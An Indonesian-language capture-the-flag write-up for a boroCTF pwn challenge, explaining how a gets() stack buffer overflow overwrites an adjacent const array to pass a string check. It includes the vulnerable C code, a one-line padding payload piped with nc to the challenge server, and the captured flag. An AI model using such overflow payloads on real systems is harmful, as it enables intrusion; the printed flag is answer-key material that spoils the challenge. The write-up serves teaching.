Writeup Two words, One problem - boroCTF (Pwn)

Tantangan ini memanfaatkan celah keamanan Buffer Overflow lokal pada variabel stack untuk memodifikasi nilai variabel const char yang seharusnya tidak dapat diubah melalui alur program normal.

Analisis Vulnerability

Di dalam fungsi main(), program menginisialisasi dua buah array karakter secara bersebelahan di dalam stack:

char non_constant[BUFFSIZE] = "I love";
const char constant[BUFFSIZE] = "barackCTF";


Meskipun variabel constant dideklarasikan menggunakan modifier const, lokasinya tetap berada pada stack frame lokal fungsi main, bukan pada segmen memori read-only (.rodata).

Program kemudian memberikan akses penulisan pada fungsi change() menggunakan fungsi berbahaya gets():

void change(char *nc) {
    printf("What would like to write?\n> ");
    gets(nc); // Vulnerability Point
    return;
}


Fungsi gets() tidak membatasi ukuran input pengguna. Dengan memberikan input yang melebihi batas BUFFSIZE (37 byte), kita dapat melompati ruang memori non_constant beserta padding alignment compiler (total 48 byte) untuk menimpa isi dari variabel constant menjadi string "boroCTF".

Ketika fungsi check() dieksekusi, kondisi berikut akan terpenuhi:

if (strcmp(c, "boroCTF") == 0) {
    // Membaca dan mencetak flag.txt
}


Langkah Eksploitasi

Solusi Satu Baris (One-Liner Pipeline)

python3 -c "import sys; sys.stdout.buffer.write(b'2\n' + b'A'*48 + b'boroCTF\n' + b'1\n')" | nc 1xgu8bd1niap.boroctf.com 34069


Eksekusi Menggunakan Script Otomatis

Jalankan file solve.py untuk mendapatkan flag dari server remote:

python3 solve.py


Flag

boroCTF{I_c@n_7ix_tH%s}
